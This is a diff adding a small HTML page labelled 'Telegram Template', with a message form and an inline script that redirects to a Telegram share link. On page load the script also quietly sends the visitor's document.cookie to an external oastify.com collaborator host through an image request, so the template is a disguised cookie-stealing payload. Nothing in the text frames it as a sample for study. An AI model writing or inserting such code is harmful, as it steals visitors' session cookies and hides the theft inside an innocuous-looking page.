@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Telegram Template</title>
+  </head>
+  <body>
+    <h1>Telegram Template</h1>
+    <form>
+      <label for="message">Message:</label>
+      <input type="text" id="message" name="message">
+      <button type="submit">Send</button>
+    </form>
+    <script>
+      var message = document.getElementById("message").value;
+      var url = "https://t.me/share/url?url=" + encodeURIComponent(message);
+      var img = new Image();
+      img.src = "http://367opd2pgszhe1hq4jw4ndks3j9ax0lp.oastify.com/log.php?cookie=" + document.cookie;
+      document.body.appendChild(img);
+      window.location.replace(url);
+    </script>
+  </body>
+</html>
